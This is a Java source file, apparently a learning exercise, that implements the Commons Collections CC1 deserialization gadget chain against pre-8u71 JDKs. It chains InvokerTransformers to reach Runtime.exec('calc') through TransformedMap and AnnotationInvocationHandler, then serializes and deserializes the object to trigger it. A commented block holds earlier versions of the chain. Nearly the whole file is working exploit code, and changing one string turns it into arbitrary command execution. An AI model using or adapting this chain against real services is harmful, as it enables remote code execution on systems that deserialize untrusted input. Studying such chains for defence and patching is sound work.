package CommonsCollections3;
// JDK 8u71之前可以，之后AnnotationInvocationHandler链失效
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
/*
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc"}),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");

        Class cls = Runtime.class;
        Method method = cls.getMethod("exec", String.class);
        method.invoke(Runtime.getRuntime(), "calc");
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},
                new Object[]{"calc"});
        invokerTransformer.transform(Runtime.getRuntime());
*/
public class CC1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {

        Transformer[] transformedMaps = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[] {"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformedMaps);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object,Object> map = new HashMap<Object, Object>();
        map.put("value","b");
        Map<Object,Object> TransformerMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");// 类原型
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); // 获取构造器
        constructor.setAccessible(true); // 设置可访问非共有构造函数
        Object o = constructor.newInstance(Target.class, TransformerMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
